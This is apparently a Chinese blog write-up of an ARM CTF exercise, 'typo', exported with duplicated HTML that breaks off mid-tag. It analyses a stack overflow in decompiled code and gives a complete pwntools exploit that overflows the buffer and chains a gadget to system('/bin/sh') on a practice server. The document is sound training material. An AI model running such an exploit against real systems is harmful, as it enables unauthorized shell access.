'/home/a1ph0nse/PwnPractice/OwnStudy/ARMpwn/typo'\n    Arch:     arm-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x8000)\n```\n\n逆向：\n\n有太多的sub了，很多函数需要靠猜。\n\n程序大概的功能就是不断随机读取单词表中的一个单词，如果输入与他一样则继续，否则告诉你`E.r.r.o.r`，输入`~`则结束，会告诉你准确率以及速度。\n\n```c\nint __cdecl main(int argc, const char **argv, const char **envp)\n{\n  void *v3; // r3\n  int v4; // r1\n  void *v5; // r2\n  void *v6; // r3\n  int v7; // r0\n  int v8; // r0\n  int correct; // r0\n  int v10; // r1\n  double v11; // r0\n  int v12; // r3\n  double v14; // [sp+8h] [bp-2Ch]\n  int v15; // [sp+10h] [bp-24h]\n  int v16; // [sp+14h] [bp-20h]\n  int idx; // [sp+18h] [bp-1Ch]\n  int v18; // [sp+1Ch] [bp-18h]\n  int v19; // [sp+20h] [bp-14h]\n  int v20; // [sp+24h] [bp-10h]\n\n  v20 = 0;\n  v19 = 0;\n  setbuf((unsigned int *)off_A1538, 0, 2);\n  setbuf((unsigned int *)off_A1534[0], 0, 2);\n  write(\n    (void *)1,\n    \"Let's Do Some Typing Exercise~\\nPress Enter to get start;\\nInput ~ if you want to quit\\n\",\n    (void *)0x56,\n    v3);\n  if ( getchar() != '\\n' )\n    exit(-1);\n  write((void *)1, \"------Begin------\", (void *)0x11, (void *)'\\n');\n  v7 = gettimeofday(0, v4, v5, v6);\n  sub_FE28(v7);\n  correct = ftime(v8);\n  v18 = correct;\n  do\n  {\n    ++v20;\n    idx = rand(correct, v10) % 4504;\n    printf(\"\\n%s\\n\", &aAbandon[20 * idx]);      // 从单词表中输出一个单词\n    correct = read_and_cmp((int)&aAbandon[20 * idx]);// 接收输入并与单词比较 漏洞在这\n    v16 = correct;\n    if ( !correct )                             // 输入的与输出的不一致则输出error\n    {\n      correct = puts((int)\"E.r.r.o.r.\");\n      ++v19;\n    }\n  }\n  while ( v16 != 2 );\n  v15 = ftime(correct);\n  LODWORD(v11) = sub_9428(v15 - v18);\n  v14 = v11 / 1000000.0;\n  write((void *)1, \"------END------\", (void *)0xF, (void *)COERCE_UNSIGNED_INT64(v11 / 1000000.0));\n  sub_11F80('\\n');\n  sub_8DF0(v20 - 1, v19, v14);\n  puts((int)\"Bye\");\n  return v12;\n}\n```\n\n重点关注接收输入并比较的函数`read_and_cmp`：\n\n```c\nint __fastcall sub_8D24(unsigned __int8 *a1)\n{\n  unsigned int len; // r0\n  int v2; // r4\n  char v6[112]; // [sp+Ch] [bp-70h] BYREF\n\n  memset(v6, 0, 100);\n  read(0, v6, (void *)0x200, v6);               // 类似read，读取0x200byte到v6，存在栈溢出\n  len = strlen(a1);\n  if ( !strcmp(a1, (unsigned __int8 *)v6, len) )\n  {\n    v2 = strlen(a1);\n    if ( v2 == strlen(v6) - 1 )\n      return 1;\n  }\n  if ( v6[0] == '~' )\n    return 2;                                   // 到这里才能跳出循环\n  return 0;\n}\n```\n\n到这里漏洞已经挺明显的了，存在栈溢出漏洞，而且程序中存在`system`和`/bin/sh`，覆盖返回地址执行`system(\"/bin/sh\")`就可以get shell了。\n\n但是`ARM`架构和`x86`架构有些不同，`ARM`栈结构不像`x86`那样有`bp`和`return_addr`垫在最下方，但也差不多。\n\n`ARM`使用`LR`寄存器（`R14`或`X30`）保存函数的返回地址，而为了能在该函数执行完后，知道上一层函数的返回地址，需要将其保存在栈上，在函数返回时更新`LR`寄存器的值，因此可以通过栈溢出覆盖这个值来控制`LR`。\n\n在进行`ROP`的时候`ARM`也有所不同，由于`POP`和`PUSH`可以对`LR`和`PC`进行操作，没有`ret`，因此控制`PC`控制程序的执行流。通常找的`gadget`后面都有对`pc`的控制，通过控制`PC`控制执行流即可。\n\nexp:\n\n```py\nfrom pwn import*\ncontext(log_level='debug',os='linux',arch='arm')\nfilename='typo'\nelf=ELF('./'+filename)\n#libc=ELF('')\n# p=process('./'+filename)\n# p=process([\"qemu-arm\", \"-g\", \"8888\", \"./typo\"])\n#p=process(['./ld-2.23.so','./'+filename],env={'LD_PRELOAD':'./libc-2.23.so'})\np=remote('node4.buuoj.cn',28805)\n\ns       = lambda data               :p.send(data)\nsl      = lambda data               :p.sendline(data)\nr       = lambda num=4096           :p.recv(num)\nrl      = lambda num=4096           :p.recvline(num)\nru      = lambda x                  :p.recvuntil(x)\nitr     = lambda                    :p.interactive()\nuu32    = lambda data               :u32(data.ljust(4,b'\\x00'))\nuu64    = lambda data               :u64(data.ljust(8,b'\\x00'))\nleak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))\n\ndef debug(cmd='\\n'):\n  gdb.attach(p,cmd)\n  pause()\n    \npop_ro_r4_pc=0x00020904\nsys_addr=0x000110B4\nbinsh_addr=0x0006C384\nr()\ns(b'\\n')\npayload=b'a'*112+p32(pop_ro_r4_pc)+p32(binsh_addr)*2+p32(sys_addr)\ns(payload)\n\nitr()\n```\n\n\n\n","slug":"typo","published":1,"updated":"2023-03-23T09:19:26.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clg9czago006k5oudg1f234vp","content":"<p>arm pwn入门题，有<code>system</code>和<code>/bin/sh</code>，简单的栈溢出。</p>\n<span id=\"more\"></span>\n\n<p>先checksec和file查下：</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 32位ARM，静态链接</span></span><br><span class=\"line\">typo: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), statically linked, <span class=\"keyword\">for</span> GNU/Linux 2.6.32, BuildID[sha1]=211877f58b5a0e8774b8a3a72c83890f8cd38e63, stripped</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 只开了NX</span></span><br><span class=\"line\">[*] <span class=\"string\">&#x27;/home/a1ph0nse/PwnPractice/OwnStudy/ARMpwn/typo&#x27;</span></span><br><span class=\"line\">    Arch:     arm-32-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    No canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x8000)</span><br></pre></td></tr></table></figure>\n\n<p>逆向：</p>\n<p>有太多的sub了，很多函数需要靠猜。</p>\n<p>程序大概的功能就是不断随机读取单词表中的一个单词，如果输入与他一样则继续，否则告诉你<code>E.r.r.o.r</code>，输入<code>~</code>则结束，会告诉你准确率以及速度。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> __cdecl <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">const</span> <span class=\"type\">char</span> **argv, <span class=\"type\">const</span> <span class=\"type\">char</span> **envp)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">void</span> *v3; <span class=\"comment\">// r3</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v4; <span class=\"comment\">// r1</span></span><br><span class=\"line\">  <span class=\"type\">void</span> *v5; <span class=\"comment\">// r2</span></span><br><span class=\"line\">  <span class=\"type\">void</span> *v6; <span class=\"comment\">// r3</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v7; <span class=\"comment\">// r0</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v8; <span class=\"comment\">// r0</span></span><br><span class=\"line\">  <span class=\"type\">int</span> correct; <span class=\"comment\">// r0</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v10; <span class=\"comment\">// r1</span></span><br><span class=\"line\">  <span class=\"type\">double</span> v11; <span class=\"comment\">// r0</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v12; <span class=\"comment\">// r3</span></span><br><span class=\"line\">  <span class=\"type\">double</span> v14; <span class=\"comment\">// [sp+8h] [bp-2Ch]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v15; <span class=\"comment\">// [sp+10h] [bp-24h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v16; <span class=\"comment\">// [sp+14h] [bp-20h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> idx; <span class=\"comment\">// [sp+18h] [bp-1Ch]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v18; <span class=\"comment\">// [sp+1Ch] [bp-18h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v19; <span class=\"comment\">// [sp+20h] [bp-14h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v20; <span class=\"comment\">// [sp+24h] [bp-10h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v20 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  v19 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  setbuf((<span class=\"type\">unsigned</span> <span class=\"type\">int</span> *)off_A1538, <span class=\"number\">0</span>, <span class=\"number\">2</span>);</span><br><span class=\"line\">  setbuf((<span class=\"type\">unsigned</span> <span class=\"type\">int</span> *)off_A1534[<span class=\"number\">0</span>], <span class=\"number\">0</span>, <span class=\"number\">2</span>);</span><br><span class=\"line\">  write(</span><br><span class=\"line\">    (<span class=\"type\">void</span> *)<span class=\"number\">1</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;Let&#x27;s Do Some Typing Exercise~\\nPress Enter to get start;\\nInput ~ if you want to quit\\n&quot;</span>,</span><br><span class=\"line\">    (<span class=\"type\">void</span> *)<span class=\"number\">0x56</span>,</span><br><span class=\"line\">    v3);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( getchar() != <span class=\"string\">&#x27;\\n&#x27;</span> )</span><br><span class=\"line\">    <span class=\"built_in\">exit</span>(<span class=\"number\">-1</span>);</span><br><span class=\"line\">  write((<span class=\"type\">void</span> *)<span class=\"number\">1</span>, <span class=\"string\">&quot;------Begin------&quot;</span>, (<span class=\"type\">void</span> *)<span class=\"number\">0x11</span>, (<span class=\"type\">void</span> *)<span class=\"string\">&#x27;\\n&#x27;</span>);</span><br><span class=\"line\">  v7 = gettimeofday(<span class=\"number\">0</span>, v4, v5, v6);</span><br><span class=\"line\">  sub_FE28(v7);</span><br><span class=\"line\">  correct = ftime(v8);</span><br><span class=\"line\">  v18 = correct;</span><br><span class=\"line\">  <span class=\"keyword\">do</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    ++v20;</span><br><span class=\"line\">    idx = rand(correct, v10) % <span class=\"number\">4504</span>;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;\\n%s\\n&quot;</span>, &amp;aAbandon[<span class=\"number\">20</span> * idx]);      <span class=\"comment\">// 从单词表中输出一个单词</span></span><br><span class=\"line\">    correct = read_and_cmp((<span class=\"type\">int</span>)&amp;aAbandon[<span class=\"number\">20</span> * idx]);<span class=\"comment\">// 接收输入并与单词比较 漏洞在这</span></span><br><span class=\"line\">    v16 = correct;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( !correct )                             <span class=\"comment\">// 输入的与输出的不一致则输出error</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      correct = <span class=\"built_in\">puts</span>((<span class=\"type\">int</span>)<span class=\"string\">&quot;E.r.r.o.r.&quot;</span>);</span><br><span class=\"line\">      ++v19;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">while</span> ( v16 != <span class=\"number\">2</span> );</span><br><span class=\"line\">  v15 = ftime(correct);</span><br><span class=\"line\">  LODWORD(v11) = sub_9428(v15 - v18);</span><br><span class=\"line\">  v14 = v11 / <span class=\"number\">1000000.0</span>;</span><br><span class=\"line\">  write((<span class=\"type\">void</span> *)<span class=\"number\">1</span>, <span class=\"string\">&quot;------END------&quot;</span>, (<span class=\"type\">void</span> *)<span class=\"number\">0xF</span>, (<span class=\"type\">void</span> *)COERCE_UNSIGNED_INT64(v11 / <span class=\"number\">1000000.0</span>));</span><br><span class=\"line\">  sub_11F80(<span class=\"string\">&#x27;\\n&#x27;</span>);</span><br><span class=\"line\">  sub_8DF0(v20 - <span class=\"number\">1</span>, v19, v14);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>((<span class=\"type\">int</span>)<span class=\"string\">&quot;Bye&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> v12;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>重点关注接收输入并比较的函数<code>read_and_cmp</code>：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> __fastcall <span class=\"title function_\">sub_8D24</span><span class=\"params\">(<span class=\"type\">unsigned</span> __int8 *a1)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">int</span> len; <span class=\"comment\">// r0</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v2; <span class=\"comment\">// r4</span></span><br><span class=\"line\">  <span class=\"type\">char</span> v6[<span class=\"number\">112</span>]; <span class=\"comment\">// [sp+Ch] [bp-70h] BYREF</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">memset</span>(v6, <span class=\"number\">0</span>, <span class=\"number\">100</span>);</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, v6, (<span class=\"type\">void</span> *)<span class=\"number\">0x200</span>, v6);               <span class=\"comment\">// 类似read，读取0x200byte到v6，存在栈溢出</span></span><br><span class=\"line\">  len = <span class=\"built_in\">strlen</span>(a1);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( !<span class=\"built_in\">strcmp</span>(a1, (<span class=\"type\">unsigned</span> __int8 *)v6, len) )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    v2 = <span class=\"built_in\">strlen</span>(a1);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( v2 == <span class=\"built_in\">strlen</span>(v6) - <span class=\"number\">1</span> )</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( v6[<span class=\"number\">0</span>] == <span class=\"string\">&#x27;~&#x27;</span> )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">2</span>;                                   <span class=\"comment\">// 到这里才能跳出循环</span></span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>到这里漏洞已经挺明显的了，存在栈溢出漏洞，而且程序中存在<code>system</code>和<code>/bin/sh</code>，覆盖返回地址执行<code>system(&quot;/bin/sh&quot;)</code>就可以get shell了。</p>\n<p>但是<code>ARM</code>架构和<code>x86</code>架构有些不同，<code>ARM</code>栈结构不像<code>x86</code>那样有<code>bp</code>和<code>return_addr</code>垫在最下方，但也差不多。</p>\n<p><code>ARM</code>使用<code>LR</code>寄存器（<code>R14</code>或<code>X30</code>）保存函数的返回地址，而为了能在该函数执行完后，知道上一层函数的返回地址，需要将其保存在栈上，在函数返回时更新<code>LR</code>寄存器的值，因此可以通过栈溢出覆盖这个值来控制<code>LR</code>。</p>\n<p>在进行<code>ROP</code>的时候<code>ARM</code>也有所不同，由于<code>POP</code>和<code>PUSH</code>可以对<code>LR</code>和<code>PC</code>进行操作，没有<code>ret</code>，因此控制<code>PC</code>控制程序的执行流。通常找的<code>gadget</code>后面都有对<code>pc</code>的控制，通过控制<code>PC</code>控制执行流即可。</p>\n<p>exp:</p>\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\">context(log_level=<span class=\"string\">&#x27;debug&#x27;</span>,os=<span class=\"string\">&#x27;linux&#x27;</span>,arch=<span class=\"string\">&#x27;arm&#x27;</span>)</span><br><span class=\"line\">filename=<span class=\"string\">&#x27;typo&#x27;</span></span><br><span class=\"line\">elf=ELF(<span class=\"string\">&#x27;./&#x27;</span>+filename)</span><br><span class=\"line\"><span class=\"comment\">#libc=ELF(&#x27;&#x27;)</span></span><br><span class=\"line\"><span class=\"comment\"># p=process(&#x27;./&#x27;+filename)</span></span><br><span class=\"line\"><span class=\"comment\"># p=process([&quot;qemu-arm&quot;, &quot;-g&quot;, &quot;8888&quot;, &quot;./typo&quot;])</span></span><br><span class=\"line\"><span class=\"comment\">#p=process([&#x27;./ld-2.23.so&#x27;,&#x27;./&#x27;+filename],env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc-2.23.so&#x27;&#125;)</span></span><br><span class=\"line\">p=remote(<span class=\"string\">&#x27;node4.buuoj.cn&#x27;</span>,<span class=\"number\">28805</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">s       = <span class=\"keyword\">lambda</span> data               :p.send(data)</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(data)</span><br><span class=\"line\">r       = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recv(num)</span><br><span class=\"line\">rl      = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recvline(num)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> x                  :p.recvuntil(x)</span><br><span class=\"line\">itr     = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">leak    = <span class=\"keyword\">lambda</span> name,addr          :log.success(<span class=\"string\">&#x27;&#123;&#125; = &#123;&#125;&#x27;</span>.<span class=\"built_in\">format</span>(name, addr))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">debug</span>(<span class=\"params\">cmd=<span class=\"string\">&#x27;\\n&#x27;</span></span>):</span><br><span class=\"line\">  gdb.attach(p,cmd)</span><br><span class=\"line\">  pause()</span><br><span class=\"line\">    </span><br><span class=\"line\">pop_ro_r4_pc=<span class=\"number\">0x00020904</span></span><br><span class=\"line\">sys_addr=<span class=\"number\">0x000110B4</span></span><br><span class=\"line\">binsh_addr=<span class=\"number\">0x0006C384</span></span><br><span class=\"line\">r()</span><br><span class=\"line\">s(<span class=\"string\">b&#x27;\\n&#x27;</span>)</span><br><span class=\"line\">payload=<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">112</span>+p32(pop_ro_r4_pc)+p32(binsh_addr)*<span class=\"number\">2</span>+p32(sys_addr)</span><br><span class=\"line\">s(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n\n\n\n","site":{"data":{}},"excerpt":"<p>arm pwn入门题，有<code>system</code>和<code>/bin/sh</code>，简单的栈溢出。</p>","more":"<p>先checksec和file查下：</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 32位ARM，静态链接</span></span><br><span class=\"line\">typo: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), statically linked, <span class=\"keyword\">for</span> GNU/Linux 2.6.32, BuildID[sha1]=211877f58b5a0e8774b8a3a72c83890f8cd38e63, stripped</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 只开了NX</span></span><br><span class=\"line\">[*] <span class=\"string\">&#x27;/home/a1ph0nse/PwnPractice/OwnStudy/ARMpwn/typo&#x27;</span></span><br><span class=\"line\">    Arch:     arm-32-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    No canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x8000)</span><br></pre></td></tr></table></figure>\n\n<p>逆向：</p>\n<p>有太多的sub了，很多函数需要靠猜。</p>\n<p>程序大概的功能就是不断随机读取单词表中的一个单词，如果输入与他一样则继续，否则告诉你<code>E.r.r.o.r</code>，输入<code>~</code>则结束，会告诉你准确率以及速度。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> __cdecl <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">const</span> <span class=\"type\">char</span> **argv, <span class=\"type\">const</span> <span class=\"type\">char</span> **envp)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">void</span> *v3; <span class=\"comment\">// r3</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v4; <span class=\"comment\">// r1</span></span><br><span class=\"line\">  <span class=\"type\">void</span> *v5; <span class=\"comment\">// r2</span></span><br><span class=\"line\">  <span class=\"type\">void</span> *v6; <span class=\"comment\">// r3</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v7; <span class=\"comment\">// r0</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v8; <span class=\"comment\">// r0</span></span><br><span class=\"line\">  <span class=\"type\">int</span> correct; <span class=\"comment\">// r0</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v10; <span class=\"comment\">// r1</span></span><br><span class=\"line\">  <span class=\"type\">double</span> v11; <span class=\"comment\">// r0</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v12; <span class=\"comment\">// r3</span></span><br><span class=\"line\">  <span class=\"type\">double</span> v14; <span class=\"comment\">// [sp+8h] [bp-2Ch]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v15; <span class=\"comment\">// [sp+10h] [bp-24h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v16; <span class=\"comment\">// [sp+14h] [bp-20h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> idx; <span class=\"comment\">// [sp+18h] [bp-1Ch]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v18; <span class=\"comment\">// [sp+1Ch] [bp-18h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v19; <span class=\"comment\">// [sp+20h] [bp-14h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v20; <span class=\"comment\">// [sp+24h] [bp-10h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v20 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  v19 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  setbuf((<span class=\"type\">unsigned</span> <span class=\"type\">int</span> *)off_A1538, <span class=\"number\">0</span>, <span class=\"number\">2</span>);</span><br><span class=\"line\">  setbuf((<span class=\"type\">unsigned</span> <span class=\"type\">int</span> *)off_A1534[<span class=\"number\">0</span>], <span class=\"number\">0</span>, <span class=\"number\">2</span>);</span><br><span class=\"line\">  write(</span><br><span class=\"line\">    (<span class=\"type\">void</span> *)<span class=\"number\">1</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;Let&#x27;s Do Some Typing Exercise~\\nPress Enter to get start;\\nInput ~ if you want to quit\\n&quot;</span>,</span><br><span class=\"line\">    (<span class=\"type\">void</span> *)<span class=\"number\">0x56</span>,</span><br><span class=\"line\">    v3);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( getchar() != <span class=\"string\">&#x27;\\n&#x27;</span> )</span><br><span class=\"line\">    <span class=\"built_in\">exit</span>(<span class=\"number\">-1</span>);</span><br><span class=\"line\">  write((<span class=\"type\">void</span> *)<span class=\"number\">1</span>, <span class=\"string\">&quot;------Begin------&quot;</span>, (<span class=\"type\">void</span> *)<span class=\"number\">0x11</span>, (<span class=\"type\">void</span> *)<span class=\"string\">&#x27;\\n&#x27;</span>);</span><br><span class=\"line\">  v7 = gettimeofday(<span class=\"number\">0</span>, v4, v5, v6);</span><br><span class=\"line\">  sub_FE28(v7);</span><br><span class=\"line\">  correct = ftime(v8);</span><br><span class=\"line\">  v18 = correct;</span><br><span class=\"line\">  <span class=\"keyword\">do</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    ++v20;</span><br><span class=\"line\">    idx = rand(correct, v10) % <span class=\"number\">4504</span>;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span 